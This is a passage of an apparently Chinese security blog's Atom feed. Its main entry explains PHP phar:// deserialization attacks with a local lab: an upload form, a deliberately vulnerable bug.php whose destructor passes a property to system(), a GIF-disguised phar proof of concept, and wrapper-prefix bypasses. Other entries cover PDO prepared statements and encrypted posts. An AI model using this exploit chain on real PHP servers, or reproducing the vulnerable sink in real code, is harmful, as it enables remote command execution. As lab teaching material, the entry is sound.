      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;
&lt;h3 id=&quot;一-入门题目&quot;&gt;&lt;a href=&quot;#一-入门题目&quot; class=&quot;headerlink&quot; title=&quot;一. 入门题目&quot;&gt;&lt;/a&gt;一. 入门题目&lt;/h3&gt;&lt;p&gt;代码如下：&lt;/p&gt;
&lt;img src=&quot;/CTF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/1.png&quot; class title=&quot;Da4er&quot;&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://da4er.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>利用phar进行反序列化扩展攻击简单总结</title>
    <link href="https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html"/>
    <id>https://da4er.top/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html</id>
    <published>2020-03-15T03:59:09.000Z</published>
    <updated>2020-03-15T04:08:29.047Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。</p><a id="more"></a><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件的组成"><a href="#phar文件的组成" class="headerlink" title="phar文件的组成"></a>phar文件的组成</h4><p>phar://的官方解释如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/1.png" class title="This is an test image"><p>简单解释就是：通过phar://的处理可以把多个文件合成一个文件(类似压缩),但是php却可以不经过解压的方法，将多个文件解释执行。</p><p>phar文件结构分为四个部分组成：stub(文件标志)，meta-data，压缩文件内容，签名。<br>一. <strong>stub  文件标志</strong><br>格式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxx&lt;?php xxxxx;__HALT_COMPILER();?&gt;</span><br></pre></td></tr></table></figure><p>二.<strong>meta-data</strong><br>每个被压缩的文件的权限，属性等信息都放在这里，这部分会以<strong>序列化</strong>的方式存储到phar文件的meta-data部分。<br><strong>这个部分是触发反序化的关键。</strong><br>三.<strong>压缩文件内容</strong><br>被压缩的文件的内容。<br>四.<strong>签名，放在文件末尾，格式如下</strong>：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/2.png" class title="This is an test image"><p>在PHP中我们不需要手动去写phar文件，因为php提供了一个phar类直接调用其中的方法即可。<br>一个小的demo文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Da4er</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        var_dump(<span class="string">"https://da4er.top"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果存在phar文件先删除</span></span><br><span class="line">@unlink(<span class="string">"da4er.phar"</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"da4er1.phar"</span>);</span><br><span class="line"><span class="comment">//开始生成phar文件</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line"><span class="comment">//设置phar文件标志</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line"><span class="comment">//自定义的meta-data文件</span></span><br><span class="line">$o = <span class="keyword">new</span> Da4er();</span><br><span class="line">$phar-&gt;setMetadata($o);<span class="comment">//将自定义的meta-data文件存入phar文件</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>,<span class="string">"test"</span>);</span><br><span class="line"><span class="comment">//在停止写入phar文件，自动生成签名</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/3.png" class title="This is an test image"><p>发现我们自定义的meta-data反序化写入到了phar文件中。</p><h4 id="触发反序化的文件函数"><a href="#触发反序化的文件函数" class="headerlink" title="触发反序化的文件函数"></a>触发反序化的文件函数</h4><p>经过上面对phar文件的理解，我们清除了phar文件中包含序列化对象，那么该怎么利用呢。这里就需要使用php内置的文件处理函数。<strong>因为大部分的文件处理函数在底层都是调用的unserialize函数。</strong><br>参考博客：<a href="https://xz.aliyun.com/t/2958#toc-0">1</a><br>受影响的文件函数如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/4.png" class title="This is an test image"><p>如果这些文件函数的参数<strong>可控</strong>的话，我们就可以进行反序化漏洞的利用。<br>demo代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Da4er&#123;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        var_dump(&quot;https:&#x2F;&#x2F;da4er.top&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename &#x3D; &quot;phar:&#x2F;&#x2F;da4er1.phar&quot;;</span><br><span class="line">@file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>触发效果如下：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/5.png" class title="This is an test image"><p>常见的绕过方式：如果题目限制的不能以phar://开头，那么我们可以使用如下方式绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br><span class="line"></span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;da4er1.phar</span><br></pre></td></tr></table></figure><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>经过对phar进行的反序列化攻击的原理说明，我们清楚了在没有unserilize的前提下，还是可以进行反序化漏洞的利用的。 但是phar的利用还是要清楚下面几点利用条件：<br><strong>1.phar文件能上传到服务器</strong><br><strong>2.文件处理函数的参数可控</strong><br><strong>3.用可以的魔法方法作为跳板</strong><br><strong>4.没有过滤像phar一些特殊字符</strong></p><h3 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h3><p>自己在本地写个文件上传代码进行测试，代码如下：<br>upload.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;</span><br><span class="line">            文件上传页面</span><br><span class="line">        &lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;form action&#x3D;&quot;check_file.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;filename&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">        &lt;&#x2F;form&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>check_file.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function get_rand_filename()</span><br><span class="line">&#123;</span><br><span class="line">    $base_filename&#x3D;@date(&quot;YmdHis&quot;);</span><br><span class="line">    &#x2F;&#x2F;形成六位随机数</span><br><span class="line">    for ($i&#x3D;0;$i&lt;6;$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        switch (mt_rand(0,2))</span><br><span class="line">        &#123;</span><br><span class="line">            case (0):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(97,122));</span><br><span class="line">                break;</span><br><span class="line">            case (1):</span><br><span class="line">                $base_filename .&#x3D;chr(mt_rand(65,90));</span><br><span class="line">            case (2):</span><br><span class="line">                $base_filename .&#x3D;mt_rand(0,9);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $base_filename;</span><br><span class="line">&#125;</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$maxsize&#x3D;1024*1024*3;</span><br><span class="line">$accept_filename&#x3D;[&quot;image&#x2F;jpg&quot;,&quot;image&#x2F;jpeg&quot;,&quot;image&#x2F;png&quot;,&quot;image&#x2F;gif&quot;];</span><br><span class="line">if (!in_array($_FILES[&quot;filename&quot;][&quot;type&quot;],$accept_filename))</span><br><span class="line">&#123;</span><br><span class="line">    exit(&quot;不允许上传&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$info&#x3D;pathinfo($_FILES[&quot;filename&quot;][&quot;name&quot;],PATHINFO_EXTENSION);</span><br><span class="line">$basename&#x3D;get_rand_filename();</span><br><span class="line">$filname&#x3D;$basename.&quot;.&quot;.$info;</span><br><span class="line">$base_dir&#x3D;&quot;G:&#x2F;&#x2F;PHPstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;PHP&#x2F;ceshi&#x2F;phar&#x2F;exercise&#x2F;upload&quot;;</span><br><span class="line">$dest&#x3D;$base_dir.&quot;&#x2F;&quot;.$filname;</span><br><span class="line">$tmp&#x3D;$_FILES[&quot;filename&quot;][&quot;tmp_name&quot;];</span><br><span class="line">move_uploaded_file($tmp,$dest);</span><br><span class="line">echo $dest;</span><br></pre></td></tr></table></figure><p>bug.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$finame &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&quot;name&quot;]:&quot;&quot;;</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1&#x3D;&quot;111&quot;;</span><br><span class="line">    public function __construct($u)&#123;</span><br><span class="line">        $this-&gt;u1s1 &#x3D; $u;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        system($this-&gt;u1s1);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">if(file_exists($finame))&#123;</span><br><span class="line">    $da4er &#x3D; new OjectTest();</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    exit(&quot;1&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;&#39;utf-8&#39;&quot;);</span><br><span class="line">class OjectTest&#123;</span><br><span class="line">    public $u1s1;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;如果存在phar文件先删除</span><br><span class="line">@unlink(&quot;da4er.phar&quot;);</span><br><span class="line">$phar &#x3D; new Phar(&quot;da4er.phar&quot;);</span><br><span class="line">&#x2F;&#x2F;开始生成phar文件</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">&#x2F;&#x2F;设置phar文件标志</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">&#x2F;&#x2F;自定义的meta-data文件</span><br><span class="line">$o &#x3D; new OjectTest();</span><br><span class="line">$o-&gt;u1s1 &#x3D; &quot;ipconfig&quot;;</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;将自定义的meta-data文件存入phar文件</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line">&#x2F;&#x2F;在停止写入phar文件，自动生成签名</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>最终的执行效果：</p><img src="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/6.png" class title="This is an test image">]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;一般的反序列化漏洞都是要通过unserialize函数，进行反序列化之后才能触发的。但是如果在没有unserialize函数触发前提下，那么该怎么利用反序列化漏洞呢？这里就需要使用phar://进行等效替代。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="https://da4er.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>PHP中的PDO预处理机制</title>
    <link href="https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html"/>
    <id>https://da4er.top/PHP%E4%B8%AD%E7%9A%84PDO%E9%A2%84%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6.html</id>
    <published>2020-03-09T15:19:41.000Z</published>
    <updated>2020-03-09T15:20:29.251Z</updated>
    
    <content type="html"><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script><p>具体代码如下，PDO预处理机制主要用于数据库交互。<br>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create By Da4er.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//使用pdo连接数据库</span></span><br><span class="line">$dsn = <span class="string">"mysql:host=127.0.0.1;port=3306;dbname=pikachu;charset=utf8"</span>;</span><br><span class="line">$username = <span class="string">"root"</span>;</span><br><span class="line">$pasword =<span class="string">"123"</span>;</span><br><span class="line">$PDOObject =<span class="keyword">new</span> PDO($dsn, $username, $pasword);</span><br><span class="line">var_dump($PDOObject);</span><br><span class="line"><span class="comment">//对象常用方法</span></span><br><span class="line"><span class="comment">//exec()函数 执行sql语句，返回影响的行数</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//query()函数，执行一个sql语句 返回一个结果集</span></span><br><span class="line"><span class="comment">//$sql = "select * from users";</span></span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//var_dump($result);</span></span><br><span class="line"><span class="comment">//lastInsertId() 返回最后插入行的id或序列值(string类型)</span></span><br><span class="line"><span class="comment">//$sql = "insert into users(id,username,password) values (null,'admin','345')";</span></span><br><span class="line"><span class="comment">//$count = $PDOObject-&gt;exec($sql);</span></span><br><span class="line"><span class="comment">//echo "影响的行数为:&#123;$count&#125;";</span></span><br><span class="line"><span class="comment">//$id = $PDOObject-&gt;lastInsertId();</span></span><br><span class="line"><span class="comment">//echo $id;</span></span><br><span class="line"><span class="comment">//setAttribute()设置pdo的一些通用属性 看手册</span></span><br><span class="line"><span class="comment">//PDOStatement对象常用方法</span></span><br><span class="line"><span class="comment">// fetch()从结果集中获取一行，并向下移动指针</span></span><br><span class="line">$sql = <span class="string">"select * from users"</span>;</span><br><span class="line"><span class="comment">//$result = $PDOObject-&gt;query($sql);</span></span><br><span class="line"><span class="comment">//while($arr=$result-&gt;fetch(PDO::FETCH_ASSOC))&#123;</span></span><br><span class="line"><span class="comment">//    print_r($arr);</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//fetchALL()返回一个包含结果集中所有行的数组</span></span><br><span class="line">$result = $PDOObject-&gt;query($sql);</span><br><span class="line">$arr = $result-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line"><span class="comment">//foreach ($arr as $key=&gt;$value)&#123;</span></span><br><span class="line"><span class="comment">//    foreach ($value as $key2=&gt;$value2)&#123;</span></span><br><span class="line"><span class="comment">//        echo $key2."=&gt;".$value2."\r\n";</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">//rowCount()返回影响行数</span></span><br><span class="line">$count = $result-&gt;rowCount();</span><br><span class="line"><span class="keyword">echo</span> $count;</span><br><span class="line"><span class="comment">//PDO预处理 important</span></span><br><span class="line"><span class="comment">//使用问号占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (?,?,?)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="number">1</span>,<span class="number">12</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">2</span>,<span class="string">"da4er"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="number">3</span>,<span class="string">"qweasdzxc"</span>);</span><br><span class="line">$result-&gt;execute();</span><br><span class="line"><span class="comment">//使用值占位符</span></span><br><span class="line">$sql = <span class="string">"insert into users(id,username,password) values (:id,:username,:password)"</span>;</span><br><span class="line">$result = $PDOObject-&gt;prepare($sql);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":id"</span>,<span class="number">13</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":username"</span>,<span class="string">"admin888"</span>);</span><br><span class="line">$result-&gt;bindValue(<span class="string">":password"</span>,<span class="string">"888"</span>);</span><br><span class="line">$result-&gt;execute();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/bai.js&quot;&gt;&lt;/script&gt;

&lt;p&gt;具体代码如下，PDO预处理机制主要用于数据库交互。&lt;br&gt;代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
      <category term="开发" scheme="https://da4er.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Python os标准库</title>
    <link href="https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html"/>
    <id>https://da4er.top/Python-os%E6%A0%87%E5%87%86%E5%BA%93.html</id>
    <published>2020-03-09T10:15:53.000Z</published>
    <updated>2020-03-09T10:17:24.222Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="b2d8fc68c60b481b01f6dbfe2f1bd3fd3dea8f4f8b3a654240f3d6dfa4a23354"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Python" scheme="https://da4er.top/categories/Python/"/>
    
    
  </entry>
  
  <entry>
    <title>Python sys标准库学习</title>
    <link href="https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://da4er.top/Python-sys%E6%A0%87%E5%87%86%E5%BA%93%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-06T10:35:33.000Z</published>
    <updated>2020-03-06T10:37:09.689Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="50defaca4203d446863e40cb64961c66687f5c95433ce224b43fb4779ce1f5b0">5b5a3e44a7afb6280dbf2374db4000a75f207f5ab9f6534d0f1ecba2a15fd4c5889909ab3d8d5dda74a909e2f7d1dd7fcb84183242a4f406e8b34ca1d4a44d4ca09161a2ff41d5b2f04ab3499364eff71e39fcf83ab96ac76123ed5bb16f4e088400a8d8040fad0667dfc42cb7d1fa63e448228607ca24df0232561378995365475e78f314e3b07003fa98288097633f811b52ecf2b29fb4317c9437f6007aaf3fa8ed6b0324167c6578e9febf6aac5b33d8ea5985376ded8930ef54de3882e79999efa94e472b3603c1661645a636aa45dbe0be163cc9083dd13b01e039827b481f919675c6401d907267f2f57914d1a56389500dc60d7a3d355eca3edefaf8f379968413ce6c0e64ecb6de36b14e9214b7cbc25fb316365d3cc7a499969749522ed4e1441e682184ff6874acd81dfc8fd18398d16338d515ac803a3d6aee9ee29fed3e40832ab3ddc04eb0e5f21b0d9f80fd42b8faba2f38534b1435cd49477febd0311a854a1a073e4141cc966b672f108b7872bf605b170bc87c20b46f80e5f270332dcf880539cc6960dacb3a9f930811300969feea3fbdb2af227d4e4c472797072e678dee9a08593f4a701d2194c9b1169994d4ee6d37ac8a2727fe945d2dbb0bf166e5a9ca61d8287ec3117fb0a9cfc2809db0010239888bc3a626559237ae6ea49fd9c9ece211246c93369f47c3dd595bb049890b311e5d5f3cf587090cb750e861268dda6ef0b0603be7f26a574abdbab262fe847759455cf57745d72a38748964b161c3ec0a12d2fa05eec1881461f31bf0a4c66c6409fbb07db98ea95608e0225194a0b3d6f4802096dc9076f5ecd48474b1c670e129e58be73c982d37409008bc80f0e8a48e8d7b692104f0c76e981f5ab834a1e22697c48f766c2dccc1e13522635d66e62646862b5bc9f2b8cddce92c849c5a74115ec567e1c27f39a987ebf7cbe28b384d4da1d35dba71d07506c1b053268b8db159a8a0a127c87625f650058b437ff6bd403a5376bb7b2aacb6d124dd4d0916875607686ff907d52132b51cf2ae72b76c4089e41050f8a87a4d59ab9834a1c8673a746d5479d2fbeabb4f0889857312703ecf10d0ed9c353688266a400d3e506f83919098b35fad52243f8f992becf161c0f151ff3f12c4db2ee1d01543c3528576fdcd53030175cc5f601c9a4fb559b44932ac53908a7910f00ff05570b7d55f0895e34d27d11da3107abc3a0c26381669faf666a2fe7dec487f1ebc42b9f36816506a81a269878f72b1160f750be69e666e1cfb044db3ddbe5afd29c0001b4594b04228f7e031060b914d86531f6ad69832dcdc47b452507edf068504f687eec198c455026f8e8c3df985b39c83eb1f67e7e3017bb754812deaabd70512056889c19a361c04dd34fc4739effe8f0b018e7a03244133a542fd638242ccdfa8aec29056894bfb4ed5b7305a0dbf3dd2334152b0f2946e3c23fd9a478808793d1321a6b6ba8638bcbd15c95572e5264cb02b19a25df0a8046f356c4e9cf37b0ced6c765f7a1975f33ef1c7b79f1253cd4ea14cdd491b64030dcecbff0a520e327468069c3e303082dd1154a6482c879960319e77e6a87539b5f711d86e5bc3914ad9117858dab5e13aa9ab585f29ff713728af45bc003d3cfd828a6de7eb32401c8930bda2ea5122338db83cb54a98f322ebf7a4227f50589a08f048e226fc5a22909bcbaa3bea8b3d23e4f66428094bcf7ff349aea94bd5736917b9b1f93aa4c5d940ca5a08df32ee01e22f58dc8aad300592664bf6d570c88a823c2f2271384c5b66c1166bdd33fc8f9be73cddce9b726736467e3214d73c1f280009859fef9b3064bf657a1a28da80e1582177e0c0711b70bbb4c1cb8b1a13b735448121e0cf2b810e5e2aaef4d195e8570f29e17de279a65b3e2f0f81b370b00a2c68afffd507835e963eb3809c9b0f42938c0f7623bc068dfd7fa38193d9ce4780a42d2cbec47f32e780c0dc23a0ada76caf482e391a29621d48431349ba7137195e265a1ed0c0